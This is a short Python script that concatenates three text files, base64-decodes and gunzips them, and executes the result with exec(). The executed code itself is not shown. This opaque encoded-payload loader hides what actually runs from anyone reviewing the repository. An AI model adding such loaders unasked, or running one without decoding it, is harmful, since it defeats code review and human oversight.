#!/usr/bin/env python3
from __future__ import annotations

import base64
import gzip
from pathlib import Path

root = Path(__file__).resolve().parents[1]
payload = "".join((root / "scripts" / f"spatial_v3_payload_{index}.txt").read_text(encoding="utf-8").strip() for index in range(1, 4))
source = gzip.decompress(base64.b64decode(payload)).decode("utf-8")
exec(compile(source, __file__, "exec"))
